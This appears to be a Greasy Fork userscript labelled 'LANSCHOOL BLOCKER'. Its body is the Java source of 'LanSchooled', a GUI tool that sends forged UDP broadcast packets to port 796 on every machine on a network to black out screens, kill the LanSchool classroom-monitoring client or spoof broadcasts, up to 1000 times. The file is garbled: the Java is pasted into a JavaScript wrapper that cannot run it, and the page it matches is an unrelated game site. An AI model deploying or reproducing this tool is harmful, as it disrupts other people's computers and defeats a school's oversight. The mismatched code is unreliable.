// ==UserScript==
// @name         LANSCHOOL BLOCKER.
// @namespace    https://greasyfork.org/en
// @version      1.0
// @description  DOES LANSCHOOL GET IN THE WAY? NOT ANYMORE WITH THIS CODE, P.S ALL CREDIT TO THE MAKER OF THIS CODE, LANSCHOOLED
// @author       POOPYSOUP
// @match        https://surviv.io/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    /import javax.swing.*;
import java.awt.*;
import java.net.*;
import java.awt.event.*;
import javax.swing.event.*;

public class LanSchooled implements ActionListener, ChangeListener
{
	private static final int MODE_BLACK_SCREENS = 7;
	private static final int MODE_KILL_LANSCHOOL = 8;
	private static final int MODE_RESTORE_SCREENS = 4;
	private static final int MODE_BORADCAST = 0;
	
	private static final String IP_ALL = "255.255.255.255";
	private static final String IP_THIS = "120.0.0.1";
	
	private static final String CHANS_ALL = "ALL";
	private static final int CHANS_DEMO = 255;
	
	private static final int PORT = 796;
	private static final int VERSON = 2;
	
	private static byte[] buffer =  new byte[350];
	
	private static JButton send = new JButton("Send");
	private static JButton exit = new JButton("Exit");
	private static JButton easyBlack = new JButton("Black Screens");
	private static JButton easyPort = new JButton("Default Port");
	private static JButton easyKill = new JButton("Kill LanSchool");
	private static JButton easyUnblack = new JButton("Restor Screens");
	private static JButton easyBorad = new JButton("Borad Cast");
	private static JButton easyAllComps = new JButton("All Comps");
	private static JButton easyThisComp = new JButton("This Comp");
	private static JButton easyAllChans = new JButton("All Channels");
	private static JButton easyDemoChan = new JButton("Demo Channel");
	private static JButton easyVerson = new JButton("Deafult Verson");
	private static JButton about = new JButton("About");
	
	private static JLabel mode = new JLabel("Mode:");
	private static JLabel verson = new JLabel("Verson:");
	private static JLabel channel = new JLabel("Channel:");
	private static JLabel ip = new JLabel("IP:");
	private static JLabel port = new JLabel("Port:");
	private static JLabel time = new JLabel("Times to run:");
	private static JLabel setMode = new JLabel("Set Mode:");
	private static JLabel setPort = new JLabel("Set Port:");
	private static JLabel setVerson = new JLabel("Set Verson:");
	private static JLabel setSend = new JLabel("Send To:");
	private static JLabel times = new JLabel("Times to send:");
	private static JLabel stats = new JLabel("Ready to send....");
	private static JLabel name = new JLabel("User Name:");
	private static JLabel compName = new JLabel("Comp Name:");
	private static JLabel msg = new JLabel("");
	
	private static JTextField fMode = new JTextField("7", 2);
	private static JTextField fVerson = new JTextField("2", 1);
	private static JTextField fChannel = new JTextField("All", 2);
	private static JTextField fPort = new JTextField("796", 3);
	private static JTextField fIP = new JTextField("255.255.255.255", 9);
	private static JTextField fTimes = new JTextField("1", 3);
	private static JTextField fName = new JTextField("Hacker Dan", 9);
	private static JTextField fCompName = new JTextField("LanSchooled", 9);
	
	private static JSlider sTimes = new JSlider(1, 1000, 1); 
	private static JProgressBar progress = new JProgressBar(0, 1);
	
	private static JFrame frame;
	
	public Component createComponents()
	{
		JPanel panel = new JPanel();
		
		JPanel packetPanel = new JPanel();
		JPanel packetPanelM = new JPanel();
		JPanel packetPanelS = new JPanel();

		JPanel oppsPanel = new JPanel();

		JPanel easyPanel = new JPanel();
		JPanel easyPanelMode = new JPanel();
		easyPanelMode.setLayout(new BoxLayout(easyPanelMode, BoxLayout.Y_AXIS));
		JPanel easyPanelSend = new JPanel();
		easyPanelSend.setLayout(new BoxLayout(easyPanelSend, BoxLayout.Y_AXIS));
		JPanel easyPanelPort = new JPanel();
		easyPanelPort.setLayout(new BoxLayout(easyPanelPort, BoxLayout.Y_AXIS));
		
		JPanel timesPanel = new JPanel();
		
		JPanel statusPanel1 = new JPanel();
		JPanel statusPanel = new JPanel();		
		
		JPanel logPanel = new JPanel();
		
		packetPanelM.add(mode);
		packetPanelM.add(fMode);
		packetPanelM.add(verson);
		packetPanelM.add(fVerson);
		packetPanelM.add(channel);
		packetPanelM.add(fChannel);
		packetPanelM.add(port);
		packetPanelM.add(fPort);
		packetPanel.add(packetPanelM);
	
		packetPanelS.add(ip);
		packetPanelS.add(fIP);
		packetPanel.add(packetPanelS);
		
		packetPanel.setBorder(BorderFactory.createCompoundBorder(
                      BorderFactory.createTitledBorder("The Packet"),
                      BorderFactory.createEmptyBorder(5,5,5,5)));

		oppsPanel.add(send);
		send.isDefaultButton();
		send.addActionListener(this);
		oppsPanel.add(about);
		about.addActionListener(this);
		oppsPanel.add(exit);
		exit.addActionListener(this);
		
		oppsPanel.setBorder(BorderFactory.createCompoundBorder(
                      BorderFactory.createTitledBorder("Main"),
                      BorderFactory.createEmptyBorder(5,5,5,5)));
		
		easyPanelMode.add(setMode);
		easyPanelMode.add(easyBlack);
		easyBlack.addActionListener(this);
		easyPanelMode.add(easyPort);
		easyPort.addActionListener(this);
		easyPanelMode.add(easyKill);
		easyKill.addActionListener(this);
		easyPanelMode.add(easyUnblack);
		easyUnblack.addActionListener(this);
		easyPanelMode.add(easyBorad);
		easyBorad.addActionListener(this);
		easyPanel.add(easyPanelMode);
		
		easyPanelSend.add(setSend);
		easyPanelSend.add(easyAllComps);
		easyAllComps.addActionListener(this);
		easyPanelSend.add(easyThisComp);
		easyThisComp.addActionListener(this);
		easyPanelSend.add(easyAllChans);
		easyAllChans.addActionListener(this);
		easyPanelSend.add(easyDemoChan);
		easyDemoChan.addActionListener(this);
		easyPanel.add(easyPanelSend);
		
		easyPanelPort.add(setPort);
		easyPanelPort.add(easyPort);
		easyPort.addActionListener(this);
		easyPanelPort.add(setVerson);
		easyPanelPort.add(easyVerson);
		easyVerson.addActionListener(this);
		easyPanel.add(easyPanelPort);
		
		easyPanel.setBorder(BorderFactory.createCompoundBorder(
                      BorderFactory.createTitledBorder("Easy Set Up"),
                      BorderFactory.createEmptyBorder(5,5,5,5)));
		
		timesPanel.add(times);
		timesPanel.add(fTimes);
		fTimes.addActionListener(this);
		timesPanel.add(sTimes);
		sTimes.addChangeListener(this);
		
		timesPanel.setBorder(BorderFactory.createCompoundBorder(
                      BorderFactory.createTitledBorder("Times To Send"),
                      BorderFactory.createEmptyBorder(5,5,5,5)));
		
		statusPanel.add(stats);
		statusPanel.add(progress);
		statusPanel1.add(msg);
		statusPanel.add(statusPanel1);
		
		statusPanel.setBorder(BorderFactory.createCompoundBorder(
                      BorderFactory.createTitledBorder("Status"),
                      BorderFactory.createEmptyBorder(5,5,5,5)));
		
		logPanel.add(name);
		logPanel.add(fName);
		fName.addActionListener(this);
		logPanel.add(compName);
		logPanel.add(fCompName);
		fCompName.addActionListener(this);
		
		logPanel.setBorder(BorderFactory.createCompoundBorder(
                      BorderFactory.createTitledBorder("Log Data To Send"),
                      BorderFactory.createEmptyBorder(5,5,5,5)));
		
		panel = new JPanel();
		panel.setLayout(new BoxLayout(panel, BoxLayout.PAGE_AXIS));
		panel.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));

		panel.add(packetPanel);
		panel.add(easyPanel);
		panel.add(logPanel);
		panel.add(timesPanel);
		panel.add(statusPanel);
		panel.add(oppsPanel);
		 
        return panel;		 
	}
	
	public static void createAndShowGUI()
	{
		JFrame.setDefaultLookAndFeelDecorated(true);
        frame = new JFrame("LanSchooled by Hacker Dan of CompSci.ca v2.1");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setSize(460,650);
		
		LanSchooled app = new LanSchooled();
        Component contents = app.createComponents();
		frame.getContentPane().add(contents, BorderLayout.CENTER);
		
		frame.setVisible(true);
	}
	
	public static void main(String args[])
	{
		buffer[0] = (byte)0x07;
		buffer[1] = (byte)0x02;
		buffer[2] = (byte)0x01;
		buffer[3] = (byte)0x3f;
		buffer[4] = (byte)0xda;
		buffer[5] = (byte)0xd1;
		
		javax.swing.SwingUtilities.invokeLater(new Runnable() 
		{
            public void run() 
            {
                createAndShowGUI();
            }
        });
	}
	
	private void showAbout()
	{
		JOptionPane.showMessageDialog(frame, "LanSchooled v2.1\nBy Hacker Dan\ndan@compsci.ca\nCompSci.ca\n\nThis applet is for educational use only and should not be used to expoit any real lanschool systems.\nI take no respoblity for it's use by other peoleop and made this only as an atmpeted to show school borads that this software is falwed.", "About LanSchooled", JOptionPane.PLAIN_MESSAGE);
	}
	
	public static int sendPacket(int mode, int verson, int chan, int port, String ip, String name, String compName)
	{
		try
      	{
      		InetAddress ipaddr = InetAddress.getByName(ip);
      		DatagramSocket mysocket = new DatagramSocket();
      		
      		buffer[0] = (byte)mode;
      		buffer[1] = (byte)verson;
      		buffer[2] = (byte)chan;
      		
      		if(verson != 2)
      			buffer[3] = (byte)0x00;
      		else
      			buffer[3] = (byte)0x3f;
      		
      		if(verson == 9)
      			verson = 2;
      			
      		
      		for(int i = 55; i < compName.length()+55; i++)
      			buffer[i] = (byte)compName.charAt(i-55);
      		
      		for(int ii = 123; ii < name.length()+123; ii++)
      			buffer[ii] = (byte)name.charAt(ii-123);
      		
      		DatagramPacket dataPacket = new DatagramPacket(buffer, buffer.length, ipaddr, port);
      		mysocket.send(dataPacket);
      		
      	}
      	catch(Exception e)
      	{
      		msg.setText("Network error, check your port and ip values as well as your network setings.");
      		stats.setText("Failed...");
      		return 0;
      	}
      	
      	return 1;
	}
	
	private void startSend()
	{
		stats.setText("Sending...");
		progress.setValue(0);
		
		boolean ok = false;
		int sent = 0;
		
		try
		{
			if (Integer.parseInt(fMode.getText()) >= 0 && Integer.parseInt(fMode.getText()) <= 255 && Integer.parseInt(fVerson.getText()) >= 0 && Integer.parseInt(fVerson.getText()) <= 255 && Integer.parseInt(fPort.getText()) >= 0 && (fChannel.getText().equalsIgnoreCase(CHANS_ALL) || (Integer.parseInt(fChannel.getText()) >= 0 && Integer.parseInt(fChannel.getText()) <= 255)))
				ok = true;
		}
		catch(Exception e)
		{
			msg.setText("Error: Bad input in packet.");
			stats.setText("Failed...");
			return;
		}
		
		if(!ok)
		{
			stats.setText("Failed...");
			msg.setText("Error: All packet values other the port most be between 0 and 255.");
			return;
		}
		
		try
		{
			if(fChannel.getText().equalsIgnoreCase(CHANS_ALL))
				progress.setMaximum(Integer.parseInt(fTimes.getText())*256);
			else
				progress.setMaximum(Integer.parseInt(fTimes.getText()));
			
			for(int i = 0; i < Integer.parseInt(fTimes.getText()); i++)
			{
				try
				{
					if(fChannel.getText().equalsIgnoreCase(CHANS_ALL))
						for(int chans = 0; chans <= 255; chans++)
						{	
							sent += sendPacket(Integer.parseInt(fMode.getText()), Integer.parseInt(fVerson.getText()), chans, Integer.parseInt(fPort.getText()), fIP.getText(), fName.getText(), fCompName.getText());	
							progress.setValue(progress.getValue() + 1);
						}
					else
					{	
						sent = sendPacket(Integer.parseInt(fMode.getText()), Integer.parseInt(fVerson.getText()), Integer.parseInt(fChannel.getText()), Integer.parseInt(fPort.getText()), fIP.getText(), fName.getText(), fCompName.getText());
						progress.setValue(progress.getValue() + 1);
					}
				}
				catch(Exception e)
				{
					msg.setText("Error: Bad input in packet.");
					stats.setText("Packet Failed...");
				}
			}
		}
		catch(Exception e)
		{
			stats.setText("Failed...");
			msg.setText("Error: Invalied times value.");
			return;
		}
		
		if(sent > 0)
		{
			msg.setText("Sent " + sent + " packets.");
			stats.setText("Ready...");
		}
		else
		{
			stats.setText("No Packets Sent...");
		}
	}
	
	public void actionPerformed(ActionEvent e)
	{
		if(e.getSource() == easyBlack)
			fMode.setText("" + MODE_BLACK_SCREENS);
		else if(e.getSource() == easyKill)
			fMode.setText("" + MODE_KILL_LANSCHOOL);
		else if(e.getSource() == easyUnblack)
			fMode.setText("" + MODE_RESTORE_SCREENS);
		else if(e.getSource() == easyBorad)
			fMode.setText("" + MODE_BORADCAST);
		else if(e.getSource() == easyAllComps)
			fIP.setText(IP_ALL);
		else if(e.getSource() == easyThisComp)
			fIP.setText(IP_THIS);
		else if(e.getSource() == easyAllChans)
			fChannel.setText(CHANS_ALL);
		else if(e.getSource() == easyDemoChan)
			fChannel.setText("" + CHANS_DEMO);
		else if(e.getSource() == easyPort)
			fPort.setText("" + PORT);
		else if(e.getSource() == easyVerson)
			fVerson.setText("" + VERSON);
		else if(e.getSource() == exit)
			System.exit(0);
		else if(e.getSource() == about)
			showAbout();
		else if(e.getSource() == send)
			startSend();
		else if(e.getSource() == fTimes)
		{
			try
			{
				if(Integer.parseInt(fTimes.getText()) > 1000) 
				{	
					sTimes.setValue(1000);
					fTimes.setText("1000");
				}
				else if(Integer.parseInt(fTimes.getText()) < 1)
				{
					sTimes.setValue(1);
					fTimes.setText("1");
				}
				else
					sTimes.setValue(Integer.parseInt(fTimes.getText()));
			}
			catch(Exception ee)
			{
				fTimes.setText("1");
			}
		}
	}
	
	public void stateChanged(ChangeEvent e)
	{
		fTimes.setText("" + sTimes.getValue());
	}
}/ Your code here...
})();